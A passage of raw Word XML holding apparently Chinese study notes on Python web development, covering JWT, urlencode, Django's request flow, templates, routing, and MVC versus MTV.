        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#3.JWT：json wed token缩写 它将用户信息加密到token中,服务器不保存任何用户信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263FC576" w14:textId="03B54F69" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#服务器通过使用保存的密钥来验证token的正确性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="778711FC" w14:textId="4D52B5CD" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="000A3959"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055</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何将</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>转换成</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的格式：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C9F3C0" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#使用urlencode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4598C253" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#from urllib.parse import urlencode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1063BF20" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#post_data={"k1"："v1","k2":"v2"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA7E15A" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#ret=urlencode(post_data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7D126A" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>#print(ret,type(ret))  #k1=v1&amp;k2=v2 &lt;class 'str'&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B94727" w14:textId="3E47DBC7" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="000A3959" w:rsidP="00325D7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003</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>什么是框架</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02EB9D74" w14:textId="77777777" w:rsidR="00325D76" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本质是socket套接字，所有框架都是对socket进行不同封装，程序员不用做一些重复性工作，专注逻辑开发，提高效率。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24042F67" w14:textId="77777777" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">4 django </w:t>
      </w:r>
      <w:r w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>执行流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58AC295E" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="007A6093" w:rsidRDefault="00325D76" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>1浏览器访问应用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A52B41" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="007A6093" w:rsidRDefault="00325D76" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>2通过路由系统找到对应的视图函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C4DA98" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="007A6093" w:rsidRDefault="00325D76" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>3 对数据库进行操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9B481A" w14:textId="6B02B4DC" w:rsidR="00325D76" w:rsidRPr="007A6093" w:rsidRDefault="00325D76" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>4 返回页面给浏览器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1329FB71" w14:textId="6ADD6B3C" w:rsidR="00325D76" w:rsidRPr="007A6093" w:rsidRDefault="000A3959" w:rsidP="007A6093">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005</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>模板系统（了解）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B945121" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1变量</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C7088E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>页面使用字典和列表方式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01940EEF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2标签</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9D9C64" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>For等</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1231EC24" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3 过滤器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59513625" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>4模板继承{%extend%}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BDB8D87" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>5模板组件{%include%}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76416451" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>6 路由系统（了解）模板系统</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E3A15D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>通过url进行匹配视图函数就是路由系统</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9FEA67" w14:textId="45B2729C" w:rsidR="00325D76" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>HTML:模板系统</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF04EC8" w14:textId="2B0C1519" w:rsidR="00325D76" w:rsidRPr="007A6093" w:rsidRDefault="000A3959" w:rsidP="007A6093">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007</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>MTV</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>MVC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F350F52" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>画MVC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3382EF64" w14:textId="5CB24CB1" w:rsidR="007A6093" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:noProof/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2C0C6BA6" wp14:editId="3A24BB7C">
            <wp:extent cx="2847975" cy="2876550"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="134" name="图片 1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在这里插入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47975" cy="2876550"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FDE57BB" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>MVC：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F43936" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>model 模型 </w:t>
      </w:r>
      <w:hyperlink r:id="rId188" w:history="1">
        <w:r w:rsidRPr="000A3959">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>models.py</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6FAAA0DA" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>view 视图 templates 模板</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210FC666" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>controller 控制器 </w:t>
      </w:r>
      <w:hyperlink r:id="rId189" w:history="1">
        <w:r w:rsidRPr="000A3959">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>urls.py</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId190" w:history="1">
        <w:r w:rsidRPr="000A3959">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>n和views.py</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0DAB351A" w14:textId="753B00EE" w:rsidR="007A6093" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>MTV:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E45F48" w14:textId="7C20EE73" w:rsidR="007A6093" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Model: 模型 </w:t>
      </w:r>
      <w:hyperlink r:id="rId191" w:history="1">
        <w:r w:rsidRPr="000A3959">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>models.py</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="62F219E5" w14:textId="0B281E15" w:rsidR="007A6093" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Templates 模板 templates 目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7591BC85" w14:textId="7CD846D8" w:rsidR="007A6093" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>View 视图 </w:t>
      </w:r>
      <w:hyperlink r:id="rId192" w:history="1">
        <w:r w:rsidRPr="000A3959">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>views.py</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="306240D9" w14:textId="72FA420B" w:rsidR="007A6093" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>区别：划分方式不同，本质相同</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AAF4461" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
